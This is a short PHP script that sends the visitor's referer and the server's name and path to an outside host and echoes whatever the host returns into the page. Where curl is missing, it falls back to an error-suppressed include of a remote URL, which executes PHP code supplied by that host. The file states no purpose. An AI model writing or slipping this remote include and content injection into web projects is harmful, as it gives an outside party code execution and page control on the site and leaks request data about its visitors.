<?php

			if(function_exists("curl_init"))

               {

                               $ch = @curl_init();

                               curl_setopt($ch, CURLOPT_URL,"http://members.creativenichemanager.info/dams/showcode.php?id=VFhjOVBRPT0rQQ==&process=split&ref_url=".$_SERVER['HTTP_REFERER']."&php_self=".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']);

                               curl_setopt($ch, CURLOPT_HEADER, 0);

                               curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

                               $resp = @curl_exec($ch);

                               $err = curl_errno($ch);



                       if($err === false || $resp == "")

                       {

                               $newsstr = "";

                       } else

                       {

                               if (function_exists("curl_getinfo"))

                               {

                                   $info = curl_getinfo($ch);

                                       if ($info["http_code"]!=200)

                                               $resp="";

                               }

                               $newsstr = $resp;

                       }

                       @curl_close ($ch);

                       echo $newsstr;

               }

               else

               {

                        @include("http://members.creativenichemanager.info/dams/showcode.php?id=Vm10YWIyRnJPVmRSYkVwUlZrUkJPUT09K1E=&process=split&ref_url=".$_SERVER['HTTP_REFERER']."&php_self=".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']);

               }



?>